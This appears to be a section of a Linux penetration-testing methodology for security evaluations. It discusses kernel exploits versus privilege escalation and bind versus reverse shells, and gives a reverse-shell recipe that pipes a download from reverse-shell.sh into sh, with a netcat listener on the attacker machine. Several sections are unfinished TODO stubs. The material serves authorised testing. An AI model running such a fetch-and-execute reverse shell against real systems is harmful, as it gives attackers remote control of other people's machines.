# General strategy
As a starting point, the attacker is able to execute either *arbitrary code* or a *system command*, but only with restricted privileges. This execution may be blind (i.e. without feedback for the attacker), especially in remote attack scenarios.
    

Where to go from there?
 - **Straight to the top**: get a kernel exploit! or...
 - **Baby steps**: try to get some feedback from the execution, i.e. escalate privileges to gain an interactive shell

How to priorize? Search first the kernel version in *Low_hanging_fruits.md*, and run Metasploit to check whether a kernel exploit exists for this version. This result leads to two opposite strategies:
 - Either an exploit with a PoC already exists - in that case go **Straight to the top**!
 - Or there is no known exploit or PoC - in that case the kernel exploit is likely to be crazy hard to pull out, so go for **Baby steps**...

# Baby steps: get a "shell" 

## Shell? Bind shell? Reverse shell?
The attacker may execute a command through a compromise session on a given port, but running a shell be not be as trivial. 
(NB: restricted shells and "almost shells" such as the Busybox `ash` are considered as applications, and therefore addressed in the [Applicative privesc](_0_Linux_pentest\3_Annex_Applicative_privesc.md) method)

This method does not really distinguish between local and remote attackers ("local" meaning here "in a user session"), but considers the local scenario as a bit unlikely: there aren't many scenarios where the attacker could trigger code execution via an application, *without having access to the user session in the first place*. Rather than speculative cases where user actions on the GUI of an ATM could trigger a controllable buffer overflow, we will consider instead a general scenario where the attacker uses an application through some king of protocol, that may be physically local (e.g. TLV communications from a smartcard to a POS) or remote (e.g. HTTP from internet to a network device). There a consequence on the type of shell you want to create.

On a local network, the attacker may typically try to open a *bind shell*, i.e. run a shell on the TOE, connect it to an open port, then connect to this port from a machine controlled by the attacker. 

However, this does not scale well on a remote setting: if the TOE is behind a firewall, it may drop the connection to this port. If there is NAT, the IP of the TOE will not be easily reachable in practice, etc. This is why on a remote setting, the attacker may instead want to run a *reverse shell*, i.e. run a command that will actively connect to the attacker machine, typically through a popular port that will not be filtered by the firewall.

As a general rule it is just as complicated to get a bind shell than a reverse shell so our method will only focus on getting a reverse shell, which works in all cases. 

The other aspect to this question is that "getting a shell" means being able to type commands on the TOE and getting outputs back, *as you would on a terminal*. In practice, it means 
 - *not only* executing a shell, 
 - *but also* executing a TTY that gives you proper I/O to the shell you execute


## Get a reverse shell
### From command execution
As we are not redteaming here, we'll use a simple and non stealthy method, using https://reverse-shell.sh/ (reverse shell as a service). The manual is displayed on the homepage and is pretty straightforward:
````
# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://reverse-shell.sh/yourip:1337 | sh
#
# 3. Don't be a dick
````
Notes:
 - This is, provided you have curl
 - you can also consider replacing sh by any shell is actually on the TOE

[TODO]: this has been included as a quick fix: add other, better reverse shell methods!

### From arbitrary code execution
[TODO]
## Get a TTY
[TODO]
